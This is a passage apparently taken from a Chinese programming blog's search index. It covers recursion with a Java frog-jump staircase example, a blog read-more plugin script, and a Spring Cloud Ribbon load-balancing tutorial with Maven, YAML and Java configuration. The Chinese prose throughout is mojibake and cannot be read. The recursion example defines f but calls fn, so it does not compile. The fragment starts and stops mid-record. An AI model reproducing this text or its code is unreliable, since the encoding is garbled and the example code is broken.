ï¼š ç¬¬ä¸€è¦ç´ ï¼šæ˜ç¡®é€’å½’å‡½æ•°æƒ³è¦å¹²ä»€ä¹ˆ ç¬¬äºŒè¦ç´ ï¼šå¯»æ‰¾é€’å½’çš„ç»“æŸæ¡ä»¶ ç¬¬ä¸‰è¦ç´ ï¼šæ‰¾å‡ºé€’å½’å‡½æ•°çš„ç­‰ä»·å…³ç³»å¼ é€’å½’çš„ä¼˜ç¼ºç‚¹ï¼š é€’å½’ä¸­å¾ˆå¤šè®¡ç®—éƒ½æ˜¯é‡å¤çš„ï¼Œç”±äºå…¶æœ¬è´¨æ˜¯æŠŠä¸€ä¸ªé—®é¢˜åˆ†è§£æˆä¸¤ä¸ªæˆ–è€…å¤šä¸ªå°é—®é¢˜ï¼Œå¤šä¸ªå°é—®é¢˜å­˜åœ¨ç›¸äº’é‡å çš„éƒ¨åˆ†ï¼Œåˆ™å­˜åœ¨é‡å¤è®¡ç®— è°ƒç”¨æ ˆå¯èƒ½ä¼šæº¢å‡ºï¼Œå…¶å®æ¯ä¸€æ¬¡å‡½æ•°è°ƒç”¨ä¼šåœ¨å†…å­˜æ ˆä¸­åˆ†é…ç©ºé—´ï¼Œè€Œæ¯ä¸ªè¿›ç¨‹çš„æ ˆçš„å®¹é‡æ˜¯æœ‰é™çš„ï¼Œå½“é€’å½’çš„å±‚æ¬¡å¤ªæ·±æ—¶ï¼Œå°±ä¼šè¶…å‡ºæ ˆçš„å®¹é‡ï¼Œä»è€Œå¯¼è‡´æ ˆæº¢å‡º é€’å½’ç”±äºæ˜¯å‡½æ•°è°ƒç”¨è‡ªèº«ï¼Œè€Œå‡½æ•°è°ƒç”¨æ˜¯æœ‰æ—¶é—´å’Œç©ºé—´çš„æ¶ˆè€—çš„ï¼›æ¯ä¸€æ¬¡å‡½æ•°è°ƒç”¨ï¼Œéƒ½éœ€è¦åœ¨å†…å­˜æ ˆä¸­åˆ†é…ç©ºé—´ä»¥ä¿å­˜å‚æ•°ã€è¿”å›åœ°å€ä»¥åŠä¸´æ—¶å˜é‡ï¼Œè€Œå¾€æ ˆä¸­å‹å…¥æ•°æ®å’Œå¼¹å‡ºæ•°æ®éƒ½éœ€è¦æ—¶é—´ï¼Œå¯¼è‡´è¿è¡Œæ•ˆç‡è¾ƒä½ é€’å½’ä¸å¾ªç¯ç›¸æ¯”ï¼Œå¾ªç¯çš„ä»£ç å¯è¯»æ€§ä¸å¦‚é€’å½’ï¼Œä½†è¿è¡Œæ•ˆç‡æ›´é«˜ æ¡ˆä¾‹åˆ†æï¼š ä¸€åªé’è›™ä¸€æ¬¡å¯ä»¥è·³ä¸Š 1 çº§å°é˜¶ï¼Œä¹Ÿå¯ä»¥è·³ä¸Š 2 çº§ï¼Œæ±‚è¯¥é’è›™è·³ä¸Šä¸€ä¸ª N çº§çš„å°é˜¶æ€»å…±æœ‰å¤šå°‘ç§è·³æ³•ï¼Ÿ æ¯æ¬¡è·³çš„æ—¶å€™ï¼Œå°é’è›™å¯ä»¥è·³ä¸€ä¸ªå°é˜¶ï¼Œä¹Ÿå¯ä»¥è·³ä¸¤ä¸ªå°é˜¶ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæ¯æ¬¡è·³çš„æ—¶å€™ï¼Œå°é’è›™æœ‰ä¸¤ç§è·³æ³• ç¬¬ä¸€ç§è·³æ³•ï¼šç¬¬ä¸€æ¬¡è·³äº†ä¸€ä¸ªå°é˜¶ï¼Œé‚£ä¹ˆè¿˜å‰©ä¸‹ n-1 ä¸ªå°é˜¶è¿˜æ²¡è·³ï¼Œå‰©ä¸‹çš„ n-1 ä¸ªå°é˜¶çš„è·³æ³•æœ‰ f (n-1) ç§ ç¬¬äºŒç§è·³æ³•ï¼šç¬¬ä¸€æ¬¡è·³äº†ä¸¤ä¸ªå°é˜¶ï¼Œé‚£ä¹ˆè¿˜å‰©ä¸‹ n-2 ä¸ª å°é˜¶è¿˜æ²¡è·³ï¼Œå‰©ä¸‹çš„ n-2 ä¸ªå°é˜¶çš„è·³æ³•æœ‰ f (n-2) ç§ æ‰€ä»¥ï¼Œå°é’è›™çš„å…¨éƒ¨è·³æ³•å°±æ˜¯è¿™ä¸¤ç§è·³æ³•ä¹‹å’Œï¼Œå³ f (n) = f (n-1) + f (n-2) 123456789101112131415public class Example { public static void main(String[] args) { int count = f(3); System.out.println(count); } public static int f(int n) { if (n &lt;= 2) { return n; } return fn(n - 1) + fn(n - 2); }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ä¼ä¸šé¢è¯•"},{title:"Ribbon å…¥é—¨æ•™ç¨‹ - åŸºç¡€ç¯‡",url:"/posts/76f2eddc.html",text:'Ribbon ä»‹ç»Ribbon æ˜¯ä»€ä¹ˆRibbon æ˜¯ Netflix å…¬å¸å¼€å‘çš„ä¸€ä¸ªè´Ÿè½½å‡è¡¡ç»„ä»¶ï¼Œè¯ç”Ÿäº 2013 å¹´ 1 æœˆï¼Œä¸€ç›´æ˜¯ Netflix æ´»è·ƒåº¦è¾ƒé«˜çš„é¡¹ç›®ï¼Œç”± Pivotal å…¬å¸å°†å…¶æ•´åˆè¿› Spring Cloud ç”Ÿæ€ã€‚Ribbon æ˜¯ä¸€ä¸ªåŸºäº HTTP å’Œ TCP çš„å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡å·¥å…·ï¼Œé€šè¿‡ Spring Cloud çš„å°è£…ï¼Œ å¯ä»¥è½»æ¾åœ°å°†é¢å‘æœåŠ¡çš„ REST æ¨¡æ¿è¯·æ±‚è‡ªåŠ¨è½¬æ¢æˆå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡çš„æœåŠ¡è°ƒç”¨ã€‚ æ­¤å¤–ï¼ŒRibbon æ‹¥æœ‰ä¸°å¯Œçš„è´Ÿè½½å‡è¡¡ç­–ç•¥ã€é‡è¯•æœºåˆ¶ã€æ”¯æŒå¤šåè®®çš„å¼‚æ­¥ä¸å“åº”å¼æ¨¡å‹ã€å®¹é”™ã€ç¼“å­˜ä¸æ‰¹æ¬¡å¤„ç†ç­‰åŠŸèƒ½ã€‚Ribbon è™½ç„¶åªæ˜¯ä¸€ä¸ªå·¥å…·ç±»æ¡†æ¶ï¼Œå®ƒä¸åƒæœåŠ¡æ³¨å†Œä¸­å¿ƒã€é…ç½®ä¸­å¿ƒã€API ç½‘å…³é‚£æ ·éœ€è¦ç‹¬ç«‹éƒ¨ç½²ï¼Œä½†æ˜¯å®ƒå‡ ä¹å­˜åœ¨äºæ¯ä¸€ä¸ª Spring Cloud æ„å»ºçš„å¾®æœåŠ¡å’ŒåŸºç¡€è®¾æ–½ä¸­ã€‚ å› ä¸ºå¾®æœåŠ¡é—´çš„è°ƒç”¨ï¼ŒAPI ç½‘å…³çš„è¯·æ±‚è½¬å‘ç­‰å†…å®¹å®é™…ä¸Šéƒ½æ˜¯é€šè¿‡ Ribbon æ¥å®ç°çš„ï¼ŒFeignã€Zuul å·²ç»é›†æˆäº† Ribbonï¼Œæ›´å¤šä»‹ç»å¯å‚è€ƒï¼šRibbon é¡¹ç›®ã€Ribbon å®˜æ–¹è‹±æ–‡æ–‡æ¡£ã€Spring Cloud Ribbon å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ Ribbon ä¸è´Ÿè½½å‡è¡¡è´Ÿè½½å‡è¡¡ï¼ˆLoad Balanceï¼‰ï¼Œå³åˆ©ç”¨ç‰¹å®šæ–¹å¼å°†æµé‡åˆ†æ‘Šåˆ°å¤šä¸ªæ“ä½œå•å…ƒä¸Šçš„ä¸€ç§æ‰‹æ®µï¼Œå®ƒå¯¹ç³»ç»Ÿååé‡ä¸ç³»ç»Ÿå¤„ç†èƒ½åŠ›æœ‰ç€è´¨çš„æå‡ï¼Œå½“ä»Šæå°‘ä¼ä¸šæ²¡æœ‰ç”¨åˆ°è´Ÿè½½å‡è¡¡å™¨æˆ–æ˜¯è´Ÿè½½å‡è¡¡ç­–ç•¥ã€‚å¸¸è§çš„è´Ÿè½½å‡è¡¡å®ç°æœ‰ Nginx ä¸ LVSï¼Œä¸”ä¸ç®¡å®ƒä»¬çš„ä½¿ç”¨æ–¹å¼ï¼Œå·¥ä½œåœ¨ä»€ä¹ˆå±‚æ¬¡ï¼Œæœ¬è´¨è¿˜æ˜¯å¯¹æµé‡çš„ç–å¯¼ã€‚ä¸šç•Œå¯¹äºè´Ÿè½½å‡è¡¡æœ‰ä¸å°‘åˆ†ç±»ï¼Œæœ€å¸¸è§çš„æœ‰è½¯è´Ÿè½½ä¸ç¡¬è´Ÿè½½ï¼Œä»£è¡¨äº§å“æ˜¯ Nginx ä¸ F5ï¼›è¿˜æœ‰ä¸€ç»„åˆ†ç±»æœ€èƒ½ä½“ç°å‡º Ribbon ä¸ä¼ ç»Ÿè´Ÿè½½å‡è¡¡çš„å·®åˆ«ï¼Œé‚£å°±æ˜¯é›†ä¸­å¼è´Ÿè½½å‡è¡¡ä¸è¿›ç¨‹å†…è´Ÿè½½å‡è¡¡ã€‚é›†ä¸­å¼è´Ÿè½½å‡è¡¡æŒ‡ä½äºå› ç‰¹ç½‘ä¸æœåŠ¡æä¾›è€…ä¹‹é—´ï¼Œå¹¶è´Ÿè´£æŠŠç½‘ç»œè¯·æ±‚è½¬å‘åˆ°å„ä¸ªæä¾›å•ä½ï¼Œè¿™æ—¶å€™ Nginx ä¸ F5 å°±å¯ä»¥å½’ä¸ºä¸€ç±»ï¼Œä¹Ÿå¯ä»¥ç§°æ˜¯æœåŠ¡ç«¯è´Ÿè½½å‡è¡¡ã€‚è¿›ç¨‹å†…è´Ÿè½½å‡è¡¡æ˜¯æŒ‡ä»ä¸€ä¸ªå®ä¾‹åº“é€‰å–ä¸€ä¸ªå®ä¾‹è¿›è¡Œæµé‡å¯¼å…¥ï¼Œåœ¨å¾®æœåŠ¡çš„èŒƒç•´å†…ï¼Œå®ä¾‹åº“ä¸€èˆ¬å­˜å‚¨åœ¨ Zookeeperã€Eurekaã€Consulã€etcd è¿™æ ·çš„æ³¨å†Œä¸­å¿ƒï¼Œè€Œæ­¤æ—¶çš„è´Ÿè½½å‡è¡¡å™¨å°±æ˜¯ç±»ä¼¼ Ribbon çš„ IPCï¼ˆInter-Process Communicationï¼Œè¿›ç¨‹é—´é€šä¿¡ï¼‰ç»„ä»¶ï¼Œå› æ­¤è¿›ç¨‹å†…è´Ÿè½½å‡è¡¡ä¹Ÿå«åšå®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ã€‚ Ribbon å…¥é—¨æ¡ˆä¾‹1. ç‰ˆæœ¬è¯´æ˜åœ¨ä¸‹é¢çš„çš„æ•™ç¨‹ä¸­ï¼Œä½¿ç”¨çš„ Spring Cloud ç‰ˆæœ¬æ˜¯ Finchley.RELEASEï¼Œå¯¹åº”çš„ Spring Boot ç‰ˆæœ¬æ˜¯ 2.0.3ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„æ¡ˆä¾‹ä»£ç  2. åˆ›å»º Maven çˆ¶çº§ Pom å·¥ç¨‹åœ¨çˆ¶å·¥ç¨‹é‡Œé¢é…ç½®å¥½å·¥ç¨‹éœ€è¦çš„çˆ¶çº§ä¾èµ–ï¼Œç›®çš„æ˜¯ä¸ºäº†æ›´æ–¹ä¾¿ç®¡ç†ä¸ç®€åŒ–é…ç½®ï¼Œå…·ä½“ Maven é…ç½®å¦‚ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.0.3.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Finchley.RELEASE&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; 3. åˆ›å»º Eureka Server å·¥ç¨‹åˆ›å»º Eureka Server çš„ Maven å·¥ç¨‹ï¼Œé…ç½®å·¥ç¨‹é‡Œçš„ pom.xml æ–‡ä»¶ï¼Œéœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-server 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-server&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Eureka Server çš„å¯åŠ¨ä¸»ç±»ï¼Œè¿™é‡Œæ·»åŠ ç›¸åº”æ³¨è§£ï¼Œä½œä¸ºç¨‹åºçš„å…¥å£ï¼š 12345678@SpringBootApplication@EnableEurekaServerpublic class EurekaServerApplication { public static void main(String[] args){ SpringApplication.run(EurekaServerApplication.class, args); }} æ·»åŠ  Eureka Server éœ€è¦çš„ application.yml é…ç½®æ–‡ä»¶åˆ°å·¥ç¨‹ä¸­ 1234567891011server: port: 8090eureka: instance: hostname: 127.0.0.1 client: registerWithEureka: false fetchRegistry: false serviceUrl: defaultZone: http://${eureka.instance.hostname}:${server.port}/eureka/ 4. åˆ›å»º Provider æºæœåŠ¡å·¥ç¨‹ä¸ºäº†æµ‹è¯• Ribbon çš„è´Ÿè½½å‡è¡¡åŠŸèƒ½ï¼Œå¿…é¡»è¦æœ‰ä¸€ä¸ªæºæœåŠ¡ï¼ˆæœåŠ¡æä¾›è€…ï¼‰ï¼Œå¹¶ä¸”å¯ä»¥é€‰æ‹©å¯åŠ¨å¤šä¸ªå®ä¾‹ï¼Œåœ¨æ¯ä¸ªå®ä¾‹ä¸­éœ€è¦æœ‰ä¸€ä¸ªæ ‡è¯†ï¼ˆä¾‹å¦‚ç«¯å£ï¼‰æ¥è¯†åˆ«æ¯æ¬¡çš„è°ƒç”¨æ˜¯åˆ°äº†ä¸åŒçš„æœåŠ¡å®ä¾‹ä¸Šã€‚è¿™é‡Œå¯ä»¥ä½¿ç”¨ä¸€ä»½ä»£ç ï¼Œé‡‡å–æ”¹å˜ç«¯å£å·çš„æ–¹å¼å¯åŠ¨å¤šæ¬¡ï¼Œå°±èƒ½å¯åŠ¨å¤šä¸ªç›¸åŒçš„æœåŠ¡å®ä¾‹ã€‚åˆ›å»º Provider çš„ Maven å·¥ç¨‹åï¼Œç”±äºéœ€è¦å°†æœåŠ¡æ³¨å†Œåˆ° Eureka Serverï¼Œå·¥ç¨‹ä¸‹çš„ pom.xml æ–‡ä»¶éœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-client 123456&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»º Provider çš„å¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ æ³¨è§£ @EnableDiscoveryClientï¼Œå°†æœåŠ¡æ³¨å†Œåˆ° Eureka Serverï¼š 12345678@SpringBootApplication@EnableDiscoveryClientpublic class ProviderApplication { public static void main(String[] args){ SpringApplication.run(ProviderApplication.class, args); }} åœ¨ application.yml æ–‡ä»¶ä¸­æŒ‡å®šæœåŠ¡åç§°ï¼ˆproviderï¼‰ã€æ³¨å†Œä¸­å¿ƒåœ°å€ä¸ç«¯å£å·ï¼Œåé¢å¯åŠ¨å¤šå®ä¾‹åªéœ€è¦ä¿®æ”¹è¿™é‡Œçš„ç«¯å£å·å³å¯ï¼š 12345678910111213server: port: 9090spring: application: name: providereureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true åˆ›å»ºç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼š 12345678@RestControllerpublic class ProviderController { @GetMapping("/provider/add") public String add(Integer a, Integer b, HttpServletRequest request) { return "From Port: " + request.getServerPort() + ", Result: " + (a + b); }} 5. åˆ›å»º Ribbon å®¢æˆ·ç«¯å·¥ç¨‹è¦ä½¿ç”¨ Ribbonï¼Œéœ€è¦åœ¨ pom.xml æ–‡ä»¶ä¸­å¼•å…¥ä¾èµ– spring-cloud-starter-netflix-ribbonï¼Œå¦å¤–ç”±äºéœ€è¦ä» Eureka Server è·å–æœåŠ¡åˆ—è¡¨ï¼Œå³ä½œä¸º Eureka å®¢æˆ·ç«¯ï¼Œè¿˜éœ€è¦å¼•å…¥ spring-cloud-starter-netflix-eureka-client 12345678910&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-ribbon&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; åˆ›å»ºå¯åŠ¨ä¸»ç±»ï¼Œæ·»åŠ æ³¨è§£ @EnableDiscoveryClient 12345678@SpringBootApplication@EnableDiscoveryClientpublic class RibbonLoadBalanceApplication { public static void main(String[] args){ SpringApplication.run(RibbonLoadBalanceApplication.class, args); }} åˆ›å»ºç»Ÿä¸€é…ç½®ç±»ï¼Œå£°æ˜ RestTemplate çš„ Beanï¼Œå¹¶ä¸”æ·»åŠ æ³¨è§£ @LoadBalancedï¼ŒæŒ‡å®šè¯¥ RestTemplate éœ€è¦ä½¿ç”¨å®¢æˆ·ç«¯è´Ÿè½½å‡è¡¡ï¼š 123456789@Configurationpublic class CommonConfiguration{ @Bean @LoadBalanced public RestTemplate restTemplate(){ return new RestTemplate(); }} åˆ›å»ºç”¨äºæµ‹è¯•çš„ Controller ç±»ï¼Œå› ä¸º Ribbon å®¢æˆ·ç«¯éœ€è¦åˆ›å»ºä¸€ä¸ª API æ¥ä¾›ç¬¬ä¸‰æ–¹è°ƒç”¨ Provider æºæœåŠ¡çš„é‚£ä¸ªè‡ªå®šä¹‰ APIï¼Œè¿™é‡Œéœ€è¦ç”¨ RestTemplate æ¥è°ƒç”¨ï¼š 123456789101112131415@RestControllerpublic class CalculateController { @Autowired private RestTemplate restTemplate; /** * è¿™é‡Œçš„"PROVIDER"æ˜¯æœåŠ¡æä¾›è€…çš„å®ä¾‹åç§°çš„è‹±æ–‡å¤§å†™ */ @GetMapping("/add") public String add(Integer a, Integer b) { String result = restTemplate.getForObject("http://PROVIDER/provider/add?a=" + a + "&amp;b=" + b, String.class); return result; }} åœ¨ application.yml æ–‡ä»¶ä¸­é…ç½®ç«¯å£å·ã€æ³¨å†Œä¸­å¿ƒåœ°å€å³å¯ï¼š 12345678910111213server: port: 8080spring: application: name: ribbon-loadbalanceeureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: true 6. æµ‹è¯• å¯åŠ¨ Eureka Server åï¼Œæ›´æ”¹ Provider æºæœåŠ¡çš„ç«¯å£å·ä¸º 9091 ä¸ 9092 ååˆ†åˆ«å¯åŠ¨ï¼Œæµè§ˆå™¨è®¿é—® http://127.0.0.1:8090ï¼ŒæŸ¥çœ‹ Eureka Server çš„ç•Œé¢æ˜¯å¦æ­£å¸¸æ˜¾ç¤ºå¤šä¸ª Provider æºæœåŠ¡ å¯åŠ¨ Ribbon å®¢æˆ·ç«¯åº”ç”¨ï¼Œæµè§ˆå™¨è®¿é—® http://127.0.0.1:8080/add?a=10&amp;b=5ï¼Œè‹¥æ­£å¸¸è¿”å›è®¡ç®—ç»“æœï¼Œè¯´æ˜æ•´ä¸ªé¡¹ç›®è¿è¡ŒæˆåŠŸ æç¤ºï¼šå½“å­˜åœ¨å¤šä¸ªæœåŠ¡æä¾›è€…æ—¶ï¼ŒRibbon é»˜è®¤ä¼šä½¿ç”¨è½®è¯¢çš„æ–¹å¼è®¿é—®æºæœåŠ¡ï¼Œæ­¤å¤– Ribbon å¯¹æœåŠ¡å®ä¾‹èŠ‚ç‚¹çš„å¢å‡ä¹Ÿèƒ½åŠ¨æ€æ„ŸçŸ¥ Ribbon è´Ÿè½½å‡è¡¡ç­–ç•¥å†…ç½®çš„ä¸ƒç§è´Ÿè½½å‡è¡¡ç­–ç•¥Ribbon æŒ‰ç…§ä¸åŒçš„éœ€æ±‚ï¼Œå·²ç»æä¾› 7 ç§å®ç°äº† IRule æ¥å£çš„å®ç°ç±»ï¼ŒåŒ…å«äº†å¸¸ç”¨çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œé»˜è®¤çš„ç­–ç•¥æ˜¯è½®è¯¢ç­–ç•¥ã€‚å†…ç½®çš„ç­–ç•¥èƒ½å¤Ÿé€‚ç”¨å¤§éƒ¨åˆ†è´Ÿè½½å‡è¡¡éœ€æ±‚çš„åº”ç”¨åœºæ™¯ï¼Œè‹¥æœ‰æ›´å¤æ‚çš„éœ€æ±‚ï¼Œå¯ä»¥è‡ªå·±å®ç° IRule æ¥å£ã€‚ ç­–ç•¥ç±» å‘½å æè¿° å®ç°è¯´æ˜ RandomRule éšæœºç­–ç•¥ éšæœºé€‰æ‹©å¯ç”¨çš„æœåŠ¡å™¨ åœ¨ index ä¸Šéšæœºï¼Œé€‰æ‹© index å¯¹åº”ä½ç½®çš„æœåŠ¡å™¨ RoundRobinRule è½®è¯¢ç­–ç•¥ æŒ‰é¡ºåºå¾ªç¯é€‰æ‹©æœåŠ¡å™¨ è½®è¯¢ indexï¼Œé€‰æ‹© index å¯¹åº”ä½ç½®çš„æœåŠ¡å™¨ RetryRule é‡è¯•ç­–ç•¥ å¯¹é€‰å®šçš„è´Ÿè½½å‡è¡¡ç­–ç•¥æœºä¸Šé‡è¯•æœºåˆ¶ åœ¨ä¸€ä¸ªé…ç½®æ—¶é—´æ®µå†…å½“é€‰æ‹©æœåŠ¡å™¨ä¸æˆåŠŸï¼Œåˆ™ä¸€ç›´å°è¯•ä½¿ç”¨ subRule çš„æ–¹å¼é€‰æ‹©ä¸€ä¸ªå¯ç”¨çš„æœåŠ¡å™¨ BestAvailableRule æœ€ä½å¹¶å‘ç­–ç•¥ é€‰æ‹©ä¸€ä¸ªå¹¶å‘è¯·æ±‚é‡æœ€å°‘çš„æœåŠ¡å™¨ é€ä¸ªè€ƒå¯ŸæœåŠ¡å™¨ï¼Œå¦‚æœæœåŠ¡å™¨çš„æ–­è·¯å™¨æ‰“å¼€ï¼Œåˆ™å¿½ç•¥ï¼Œå†é€‰æ‹©å…¶ä»–å¹¶å‘è¿æ¥æ•°æœ€ä½çš„æœåŠ¡å™¨ AvailabilityFilteringRule å¯ç”¨è¿‡æ»¤ç­–ç•¥ è¿‡æ»¤æ‰ä¸€ç›´è¿æ¥å¤±è´¥å¹¶è¢«æ ‡è®°ä¸º circuit tipped çš„æœåŠ¡å™¨ï¼Œè¿‡æ»¤æ‰é‚£äº›é«˜å¹¶å‘è¿æ¥çš„æœåŠ¡å™¨ï¼ˆactive connections è¶…è¿‡é…ç½®çš„é˜€å€¼ï¼‰ ä½¿ç”¨ä¸€ä¸ª AvailabilityPredicate æ¥åŒ…å«è¿‡æ»¤æœåŠ¡å™¨çš„é€»è¾‘ï¼Œå…¶å®å°±æ˜¯æ£€æŸ¥ status é‡Œè®°å½•çš„å„ä¸ªæœåŠ¡å™¨çš„è¿è¡ŒçŠ¶æ€ WeightedResponseTimeRule å“åº”æ—¶é—´åŠ æƒç­–ç•¥ æ ¹æ®æœåŠ¡å™¨çš„å“åº”æ—¶é—´åˆ†é…æƒé‡ã€‚å“åº”æ—¶é—´è¶Šé•¿ï¼Œæƒé‡è¶Šä½ï¼Œè¢«é€‰æ‹©åˆ°çš„æ¦‚ç‡è¶Šä½ï¼›å“åº”æ—¶é—´è¶ŠçŸ­ï¼Œæƒé‡è¶Šé«˜ï¼Œè¢«é€‰æ‹©åˆ°çš„æ¦‚ç‡å°±è¶Šé«˜ã€‚è¿™ä¸ªç­–ç•¥å¾ˆè´´åˆ‡ï¼Œç»¼åˆäº†å„ç§å› ç´ ï¼Œå¦‚ï¼šç½‘ç»œã€ç£ç›˜ã€CPU ç­‰ï¼Œè¿™äº›å› ç´ éƒ½ç›´æ¥å½±å“ç€å“åº”æ—¶é—´ ä¸€ä¸ªåå°çº¿ç¨‹å®šæœŸçš„ä» status é‡Œé¢è¯»å–è¯„ä»·å“åº”æ—¶é—´ï¼Œä¸ºæ¯ä¸ªæœåŠ¡å™¨è®¡ç®—ä¸€ä¸ªæƒé‡ï¼›å…¶ä¸­æƒé‡çš„è®¡ç®—ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œresponsetime å‡å»æ¯ä¸ªæœåŠ¡å™¨è‡ªå·±å¹³å‡çš„ responsetime å°±æ˜¯æœåŠ¡å™¨çš„æƒé‡ã€‚å½“åˆšå¼€å§‹è¿è¡Œï¼Œæ²¡æœ‰å½¢æˆ status æ—¶ï¼Œä½¿ç”¨è½®è¯¢ç­–ç•¥é€‰æ‹©æœåŠ¡å™¨ ZoneAvoidanceRule åŒºåŸŸæƒè¡¡ç­–ç•¥ ç»¼åˆåˆ¤æ–­æœåŠ¡å™¨æ‰€åœ¨åŒºåŸŸçš„æ€§èƒ½å’ŒæœåŠ¡å™¨çš„å¯ç”¨æ€§æ¥è½®è¯¢é€‰æ‹©æœåŠ¡å™¨ï¼Œå¹¶ä¸”åˆ¤æ–­ä¸€ä¸ª Zone çš„è¿è¡Œæ€§èƒ½æ˜¯å¦å¯ç”¨ï¼Œå‰”é™¤ä¸å¯ç”¨çš„ Zone ä¸­çš„æ‰€æœ‰æœåŠ¡å™¨ ä½¿ç”¨ ZoneAvoidancePredicate å’Œ AvailabilityPredicate æ¥åˆ¤æ–­æ˜¯å¦é€‰æ‹©æŸä¸ªæœåŠ¡å™¨ï¼Œå‰ä¸€ä¸ªåˆ¤æ–­åˆ¤å®šä¸€ä¸ª zone çš„è¿è¡Œæ€§èƒ½æ˜¯å¦å¯ç”¨ï¼Œå‰”é™¤ä¸å¯ç”¨çš„ zone çš„æ‰€æœ‰æœåŠ¡å™¨ï¼ŒAvailabilityPredicate åˆ™ç”¨äºè¿‡æ»¤æ‰è¿æ¥æ•°è¿‡å¤šçš„æœåŠ¡å™¨ å…¨å±€è´Ÿè½½å‡è¡¡ç­–ç•¥çš„é…ç½®ä½¿ç”¨ Ribbon çš„æ—¶å€™è‹¥æƒ³è¦å…¨å±€æ›´æ”¹è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œæ­¤æ—¶åªéœ€è¦å¢åŠ ä¸€ä¸ªé…ç½®ç±»ï¼ŒåŠ ä¸Šä¹‹åå‡¡æ˜¯é€šè¿‡ Ribbon çš„è¯·æ±‚éƒ½ä¼šæŒ‰ç…§é…ç½®çš„ç­–ç•¥æ¥è¿›è¡Œè´Ÿè½½å‡è¡¡ 12345678@Configurationpublic class RuleConfiguration { @Bean public IRule customRule(){ return new RandomRule(); }} åŸºäºæ³¨è§£çš„è‡ªå®šä¹‰ç­–ç•¥é…ç½®è‹¥æƒ³é’ˆå¯¹æŸä¸€ä¸ªæºæœåŠ¡è®¾ç½®å…¶ç‰¹æœ‰çš„è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ @RibbonClient æ³¨è§£æ¥å®ç°ã€‚ åˆ›å»º @AvoidScan æ³¨è§£ç±»ï¼Œåªæœ‰ä¸€ä¸ªç©ºçš„å£°æ˜ 123public @interface AvoidScan {} é…ç½®ç±»é‡Œæ³¨å…¥é’ˆå¯¹ Ribbon å®¢æˆ·ç«¯çš„é…ç½®ç®¡ç†å™¨ï¼ˆéå¿…é¡»ï¼‰ï¼Œæ·»åŠ  @AvoidScan æ³¨è§£ 123456789101112@AvoidScan@Configurationpublic class RuleConfiguration { @Autowired IClientConfig config; @Bean public IRule customRule(IClientConfig config){ return new RandomRule(); }} å¯åŠ¨ä¸»ç±»åŠ 